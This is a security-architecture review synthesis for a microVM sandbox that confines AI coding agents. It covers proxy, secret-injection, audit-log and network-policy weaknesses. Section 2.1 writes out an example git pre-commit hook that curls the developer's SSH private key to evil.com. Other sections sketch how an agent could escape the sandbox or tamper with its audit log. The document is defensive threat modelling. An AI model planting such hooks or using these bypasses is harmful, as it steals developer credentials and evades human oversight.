# Oracle Review Synthesis

**Date:** February 8, 2026
**Reviewers:** Codex (o3, Skeptical Engineer), Kimi 2.5 (Product/UX Architect), Sonnet 4.5 (Security Architect), Opus 4.6 (Deep Security)
**Synthesis by:** Claude (Gemini session, coordinating architect)

---

## Verdict

**GO, with mandatory pre-implementation fixes.**

All four oracles agree the architecture is fundamentally sound and the product gap is real. No oracle recommended killing the project. But they surfaced **2 critical architectural oversights**, **1 critical risk needing immediate validation**, and a pattern of overconfident security claims that need honest restatement.

---

## 1. Convergent Concerns (Raised by 3+ Oracles)

These are the issues every reviewer flagged independently. They're real.

### 1.1 MITM Proxy Is Load-Bearing and Fragile

**Raised by:** All four oracles
**Severity:** Critical (systemic)

Every oracle identified the MITM proxy as simultaneously the core differentiator and the highest-risk component. Specific concerns:

| Concern | Raised by |
|---------|-----------|
| TSI mode may not support interception | Sonnet (C-1), Opus (structural), Codex (#1) |
| Package managers may reject ephemeral CA | Sonnet (C-2), Codex (#1), Kimi (error UX) |
| Proxy is highest-value attack target | Opus (Finding 9), Codex (#1) |
| HTTP/2, streaming, modern features | Sonnet (H-9), Opus (Finding 11), Codex (#4) |

**Assessment:** This is real. The proxy is the product. If it breaks, nothing works.

**Action:**
- PS-1 is do-or-die. TSI interception must be validated before any other work.
- PS-4 (MITM proxy) gets elevated to tied-P0 with PS-1. Start prototyping the proxy in parallel.
- If TSI doesn't work: passt/gvproxy mode. If MITM doesn't work with major package managers: fall back to CONNECT proxy + scoped token injection (less elegant but functional).
- Use `hyper` and `rustls` — no custom HTTP/TLS parsing. Fuzz the proxy from day one.

### 1.2 `inject_mode = "env"` Undermines Security Claims

**Raised by:** All four oracles
**Severity:** High

The oracles disagree on the remedy but agree on the problem:

| Oracle | Position |
|--------|----------|
| Codex | Two-tier security model will confuse users. Should be treated as "first-order product truth, not a side note." |
| Kimi | The env backend trap means MVP's security story is unconvincing. |
| Sonnet | **Remove `inject_mode = "env"` from v1 entirely.** Only support header/query injection. |
| Opus | Needed but must be treated as a separate security tier with its own threat model. |

**Assessment:** Sonnet's position (remove entirely) is the most principled but impractical — agents need model API keys in env vars to function. Opus's position (separate tier, documented honestly) is correct.

**Action:**
- Keep `inject_mode = "env"` but implement Opus's recommendation:
  - Separate security tier with explicit documentation
  - Config-level acknowledgment: `[secrets.ANTHROPIC_API_KEY] inject_mode = "env"  # WEAKER: visible inside VM`
  - Audit log marks env-injected secrets distinctly
  - v1.1: investigate host-side model proxy (Claude Code connects to localhost, host adds real key) as a way to eliminate env injection for model API keys
- Restate invariant I-3: "Real secrets are not visible inside the VM **when using header/query injection mode**. Secrets using `inject_mode = "env"` are visible to processes inside the VM. Network policy prevents exfiltration."

### 1.3 Response Scrubbing Is Not Optional

**Raised by:** Codex (#2), Sonnet (C-4), Opus (Finding 5)
**Severity:** High

All three security-focused oracles flagged the response scrubbing dismissal. Opus constructed a concrete attack: API echoes token → agent writes to project file → secret persists on host disk → exits through git push.

Codex added: allowed-host exfiltration paths (Gist APIs, issue comments, cloud storage endpoints) make this worse than assumed.

**Assessment:** The "network policy prevents exfiltration" argument is incomplete. Secrets can exit through authorized channels (git push, API writes to allowed hosts). Response scrubbing is defense-in-depth worth having.

**Action:**
- Implement response HEADER scrubbing for v1. Scan response headers for exact matches of injected secret values, replace with placeholder. This is cheap (small data, exact match).
- Response BODY scrubbing deferred to v1.1 (expensive, false positives, breaks binary protocols).
- Document the residual risk: "Secrets may appear in response bodies from authorized hosts. Redan scrubs response headers but not bodies."

### 1.4 Audit Log Is Insufficient

**Raised by:** Codex (#6), Sonnet (H-2), Opus (Finding 8)
**Severity:** High

Three concerns:

| Issue | Oracle |
|-------|--------|
| JSONL is developer-debug-log, not forensic evidence | Codex |
| Missing forensic context (guest PID, HTTP method, path, status code) | Sonnet |
| **Audit log stored in agent-writable directory** | Opus |

Opus's finding is the most critical: `.redan/audit.jsonl` is inside `/workspace/`, which is the virtio-fs mount. The agent can read, modify, or delete it.

**Assessment:** The audit log location is a clear bug. The schema is a design improvement.

**Action:**
- **Move audit log to host-only path immediately.** `$XDG_STATE_HOME/redan/sessions/<session_id>/audit.jsonl`. Not accessible from inside the VM. This is non-negotiable.
- Expand schema to include HTTP method, path (not query string — may contain secrets), response status code, guest PID if available.
- Keep `.redan/` in project for convenience (config file, not logs).
- v1.1: HMAC signatures on log entries, optional remote forwarding.

### 1.5 MVP Scope Is Still Too Wide

**Raised by:** Codex (#7), Kimi (multiple sections)
**Severity:** High

Codex: "Cut harder. One agent workflow. One protocol class. One secret backend. One OS target if needed."

Kimi: "The current design optimizes for security purity at the cost of developer velocity."

**Assessment:** Codex is right. The MVP tries to be a complete product.

**Action:**
- **MVP scope (revised):**
  - One command: `redan exec`
  - One config: `redan.toml` (simplified, see 2.2 below)
  - One secret backend: `env` (with honest messaging about what this provides)
  - Two platforms: Linux x86_64 (primary), macOS aarch64 (if stable in spikes, else deferred)
  - One protocol: HTTPS (via MITM proxy)
  - One agent verified working: Claude Code
  - Non-HTTP protocols: blocked entirely in MVP
- **Not in MVP:** MCP server, Pi extension, Vault/AWS backends, macOS (conditional), warm pool, custom images, named volumes

---

## 2. Unique Critical Findings

### 2.1 Git Hooks Persistence Attack (Opus, Finding 2)

**Severity: CRITICAL — this is a real, exploitable attack.**

Opus constructed a complete attack tree that works as designed:

1. Compromised agent writes to `/workspace/.git/hooks/pre-commit`
2. Script: `#!/bin/sh\ncurl evil.com -d "$(cat ~/.ssh/id_ed25519)"`
3. VM tears down. Session ends.
4. Developer runs `git commit` on host — hook executes as the developer.
5. SSH key exfiltrated. No Redan protection (hook runs outside VM).

This extends to: `.github/workflows/`, `.vscode/tasks.json`, `Makefile`, `.husky/`, `package.json` scripts — any file the developer's toolchain executes on the host.

**Assessment:** This is the most important finding across all four reviews. It's a practical persistence attack that violates the stated security model without requiring any implementation bugs.

**Action (must-fix for v1):**
- Snapshot executable paths before session: `.git/hooks/`, `.github/workflows/`, `.vscode/tasks.json`, `Makefile`, `Justfile`, `.husky/`
- After session: diff against snapshot. If modified, display a clear warning:
  ```
  redan: ⚠️  Modified executable files detected:
    .git/hooks/pre-commit (NEW)
    .github/workflows/deploy.yml (CHANGED)
  
  These files run on YOUR machine outside Redan's protection.
  Review changes before running git commit, make, etc.
  ```
- v1.1: mount `.git/hooks/` read-only. Allow explicit opt-in for agents that need to create hooks.
- Add to adversarial test suite.

### 2.2 Zero-Config Mode Needed (Kimi, Section 2)

**Severity: High (adoption)**

Kimi's analysis of the first-run experience is devastating. The 80-line `redan.toml` example will kill adoption. Key insight:

> "A developer should be able to `redan exec -- claude` without creating a config file."

Auto-detection from project context:
- `package.json` → allow npm registries, use node image
- `requirements.txt` → allow pypi.org, use python image
- `.git/config` → allow github.com/gitlab.com

**Assessment:** This is a great idea that doesn't compromise security. Default-deny still applies — auto-detection adds to the allowlist, not opens it wide.

**Action:**
- Implement `redan exec` with no config file: detect project type, suggest allowlist, boot with defaults
- `redan init` generates a minimal config (~6-10 lines) not the full reference
- Full reference config lives in docs, not in generated files
- `redan init --full` for the complete template if someone wants it

### 2.3 Symlink Traversal via virtio-fs (Opus, Finding 1)

**Severity: High**

Pre-existing symlinks in the project directory that point to host paths outside the mount are a traversal risk. If virtiofsd follows them, the agent can read host files through the project directory.

**Action:**
- Configure virtiofsd (or libkrun's equivalent) in most restrictive mode: no symlink following outside shared root
- Add to PS-2: create a project with symlinks pointing to `~/.ssh/`, verify VM cannot follow them
- Add to adversarial test suite

### 2.4 Raw IP Connections Bypass Hostname Policy (Opus, Finding 3)

**Severity: High**

Network policy is hostname-based. An agent connecting by raw IP (`connect("93.184.216.34", 443)`) bypasses hostname matching.

**Action:**
- Explicit policy: all connections to raw IP addresses BLOCKED by default
- The proxy only allows connections resolved through hostname → DNS → IP path
- Add to adversarial test suite: `curl 140.82.121.6` must be blocked even if `api.github.com` resolves to that IP

### 2.5 Domain Fronting via Allowed Hosts (Opus, Finding 4)

**Severity: Medium**

MITM proxy must verify HTTP `Host` header matches TCP destination. Without this, an agent can connect to `api.github.com:443` (allowed) but send `Host: evil.com` — if a CDN fronts both, the request reaches `evil.com`.

**Action:**
- Proxy validates `Host`/`:authority` matches TCP destination hostname (or documented alias)
- Log mismatches as suspicious events in audit log
- Add to adversarial test suite

---

## 3. Oracle Disagreements

### 3.1 `inject_mode = "env"`: Remove vs. Keep

| Oracle | Position |
|--------|----------|
| Sonnet | Remove entirely from v1 |
| Opus | Keep but separate tier |
| Codex | Keep but be honest about two-tier model |
| Kimi | The env backend is the weak link in MVP story |

**My assessment: Opus is right.** Remove entirely is impractical — agents need model API keys. But treating it as a separate, explicitly weaker tier with distinct documentation and audit behavior is correct. The key is honesty: don't claim I-3 holds for env-injected secrets.

### 3.2 MVP Secret Backend: env Only vs. Add 1Password

| Oracle | Position |
|--------|----------|
| Codex | Cut to one backend (env). Ship narrow. |
| Kimi | Move 1Password CLI to MVP. The env backend trap makes the security story unconvincing. |
| Sonnet | env + one enterprise backend for v1.0 |
| Opus | env is fine for MVP if honest about limitations |

**My assessment: Codex is right for MVP.** env only. 1Password is v1.0 (first real release after MVP validation). The MVP's job is to validate the architecture and get feedback, not win a security argument. Be honest about what MVP provides: "network isolation and secret hiding, not identity separation."

### 3.3 Cross-Platform: Ship Both or Pick One?

| Oracle | Position |
|--------|----------|
| Codex | Pick one reference platform first. Cross-platform is premature. |
| Research | macOS aarch64 is P0 (developer laptops) |

**My assessment: Conditional.** Linux x86_64 is the primary target. macOS aarch64 is P0 IF the spikes show it's stable. If macOS is flaky, defer to v1.0 and ship Linux-only MVP. Don't hold up the product for cross-platform parity.

### 3.4 `--no-sandbox` Escape Hatch

| Oracle | Position |
|--------|----------|
| Sonnet | Remove entirely. If you need to bypass Redan, just don't use Redan. |
| Codex | Keep but will become the default under deadline pressure. |
| Opus | Not specifically flagged. |

**My assessment: Sonnet is right.** Remove `--no-sandbox`. It defeats audit, creates a social engineering vector (prompt injection: "please run with --no-sandbox"), and adds nothing that `redan exec` without Redan doesn't already provide. Keep `--allow-all-hosts` (logged) for debugging.

---

## 4. Risk Register Updates

### New Risks (from oracle reviews)

| ID | Risk | Likelihood | Impact | Rating | Source |
|----|------|-----------|--------|--------|--------|
| R13 | Git hooks persistence: agent writes hooks that execute on host post-session | High | High | 🔴 Critical | Opus F2 |
| R14 | Symlink traversal: project symlinks escape virtio-fs mount boundary | Medium | High | 🟠 High | Opus F1 |
| R15 | Audit log tampering: log stored in agent-writable directory | High | Medium | 🟠 High | Opus F8 |
| R16 | OCI image supply chain compromise | Medium | High | 🟠 High | Opus F19 |
| R17 | Raw IP connections bypass hostname policy | Medium | High | 🟠 High | Opus F3 |
| R18 | Response reflection exposes secrets to VM memory and project files | Medium | Medium | 🟡 Medium | All security oracles |
| R19 | Domain fronting via allowed hosts | Low | High | 🟡 Medium | Opus F4 |
| R20 | HTTP request smuggling through MITM proxy | Low | High | 🟡 Medium | Opus F7 |

### Risk Reassessments

| ID | Original | Revised | Reason |
|----|----------|---------|--------|
| R1 (TSI networking) | 🟠 High | 🟠 High | Confirmed by 3 oracles. PS-1 is do-or-die. |
| R4 (MITM breaks package managers) | 🟠 High | 🟠 High | Confirmed. Sonnet: "if >30% of common operations fail, reconsider MITM entirely." |
| R6 (Boot time) | 🟢 Low | 🟠 High | Sonnet: real-world estimate 500-800ms cold start. Revise upward. |
| R7 (Competitor convergence) | 🟠 High | 🟠 High | Codex: "gap may be real but pain may not be." Need user validation. |

### Retired Risks

None retired. All original risks confirmed as legitimate.

---

## 5. Revised Prototype Plan

### Changes from Oracle Reviews

1. **PS-1 expanded:** Must test TSI interception depth AND raw IP blocking AND IPv6 handling.
2. **PS-2 expanded:** Must test symlink traversal AND macOS performance AND large `.git/` directories.
3. **PS-4 expanded:** Must test against real package managers (npm, pip, cargo, git) with ephemeral CA. Add Host header validation. Add HTTP/2 CONTINUATION handling.
4. **PS-5 expanded:** Add response header scrubbing to the end-to-end flow.
5. **NEW PS-6: Adversarial test suite.** Dedicated spike for attack validation:
   - Git hooks injection → verify detection/warning
   - Symlink traversal → verify blocked
   - Raw IP connection → verify blocked
   - Placeholder in request to unauthorized host → verify meaningless
   - `env` mode secret → read from `/proc/self/environ` → verify network blocks exfiltration
   - Response reflection → verify header scrubbing

### Revised Schedule

```
Week 1:
├── PS-1: libkrun VM boot + TSI interception + IP blocking (5 days)
└── PS-2: virtio-fs perf + symlinks + macOS (3 days, parallel)

Week 2:
├── PS-3: Agent transparency — Claude Code in VM (3-4 days)
└── PS-4: MITM proxy + CA + Host validation (starts mid-week, 7 days total)

Week 3:
├── PS-4: continued
├── PS-5: End-to-end secret flow + response scrubbing (3-4 days)
└── PS-6: Adversarial test suite (2-3 days, after PS-4/PS-5)

Week 4: Buffer + findings synthesis + architecture updates
```

**Total: 4 weeks** (up from 3). The extra week accounts for expanded scope on PS-1, PS-4, and the new PS-6.

---

## 6. Invariant Restatements

Per Opus's invariant analysis, several invariants need honest restatement:

| # | Original | Revised |
|---|----------|---------|
| I-3 | Real secrets never visible inside VM | Real secrets are not visible inside the VM when using header/query injection. Secrets using `inject_mode = "env"` are visible to guest processes. |
| I-5 | Agent identity is separate from developer identity | Agent identity is separate from developer identity when using enterprise secret backends (Vault, AWS SM). With `env` backend, the agent uses the developer's credentials. |
| I-7 | Project file changes are controlled | Project files are shared in real-time via virtio-fs. Changes by the agent are immediately visible on the host. Git provides the review mechanism. |
| I-8 | No persistent host modification | Agent cannot modify host files outside the project directory. Files within the project (including git hooks, CI configs, Makefiles) are modifiable and will persist. Redan warns when executable project files are modified. |

---

## 7. Consolidated Action Items

### Must-Fix Before Implementation (Architectural)

| # | Action | Source | Effort |
|---|--------|--------|--------|
| A1 | Move audit log to host-only path (`$XDG_STATE_HOME/redan/`) | Opus F8 | Small |
| A2 | Implement git hooks / executable file diff detection + warning | Opus F2 | Medium |
| A3 | Block raw IP connections by default | Opus F3 | Small |
| A4 | Configure virtio-fs to prevent symlink traversal | Opus F1 | Small |
| A5 | Validate HTTP Host header matches TCP destination in proxy | Opus F4 | Small |
| A6 | Remove `--no-sandbox` escape hatch | Sonnet H-4 | Small |
| A7 | Restate invariants I-3, I-5, I-7, I-8 honestly | Opus Part 1 | Small |
| A8 | Implement response header scrubbing (exact match) | All security oracles | Medium |

### Must-Fix Before MVP (DX)

| # | Action | Source | Effort |
|---|--------|--------|--------|
| A9 | Zero-config mode: auto-detect project type, suggest allowlist | Kimi | Medium |
| A10 | `redan init` generates minimal config (6-10 lines), not reference | Kimi | Small |
| A11 | Actionable error messages with fix suggestions | Kimi | Medium |
| A12 | `redan doctor` for prerequisite checking (KVM, libkrun) | Kimi | Small |

### Should-Fix for v1.0

| # | Action | Source | Effort |
|---|--------|--------|--------|
| A13 | 1Password CLI backend | Kimi | Medium |
| A14 | Expanded audit log schema (method, path, status code) | Sonnet H-2 | Small |
| A15 | OCI image digest verification (warn on tag-only) | Opus F19 | Small |
| A16 | IPv6 blocking (localhost, link-local, unique-local, multicast) | Sonnet H-3 | Small |
| A17 | Proxy resource limits (max connections, header size, timeouts) | Opus F9 | Small |
| A18 | Document bootstrap credential flows concretely per backend | Sonnet H-6, Opus F13 | Medium |

---

## 8. What the Oracles Got Right That We Missed

1. **The git hooks attack** (Opus) — nobody on the planning side considered that agent writes to the project directory could achieve persistent code execution on the host. This is the most valuable finding.

2. **Audit log in agent-writable directory** (Opus) — obvious in retrospect. The agent can tamper with its own audit trail.

3. **Raw IP bypass of hostname policy** (Opus) — hostname-based policy needs IP-level enforcement too.

4. **Zero-config mode** (Kimi) — the 80-line config file is hostile to adoption. Auto-detection is the right approach.

5. **Boot time underestimation** (Sonnet) — 500-800ms cold start is realistic. This needs measurement, not optimism.

6. **"Same as Lambda" comparison is misleading** (Opus) — same isolation class, not same security posture. Be precise.

---

## 9. What the Oracles May Have Overcorrected On

1. **Removing `inject_mode = "env"` entirely** (Sonnet) — impractical. Agents need model API keys. The right answer is honest documentation and a separate security tier, not removal.

2. **Response body scrubbing for v1** (Sonnet) — header scrubbing yes, body scrubbing is too expensive and fragile for v1. The residual risk (secret in response body written to project file) is real but acceptable when documented.

3. **3-week spike timeline is "not credible"** (Codex) — it was 3 weeks for directional answers, which is reasonable. Now revised to 4 weeks with expanded scope.

---

## Conclusion

The four oracles surfaced 40+ findings. After deduplication and severity assessment:

- **2 critical architectural fixes** (git hooks protection, audit log location)
- **1 critical technical validation** (TSI interception — PS-1)
- **6 high-severity fixes** (IP blocking, symlink traversal, Host validation, response scrubbing, `--no-sandbox` removal, invariant restatements)
- **4 high-severity DX improvements** (zero-config, minimal init, error messages, doctor command)
- **6 should-fix items** for v1.0

None of these are architectural dead ends. The core design (libkrun microVM + network-layer secret injection + pluggable backends) survives scrutiny. The oracles found real holes in the implementation details — exactly what oracle reviews are for.

The revised plan is tighter, more honest, and more likely to produce a product that developers actually trust and use.

**Next step:** Start PS-1. Everything else depends on whether TSI gives us the interception point.
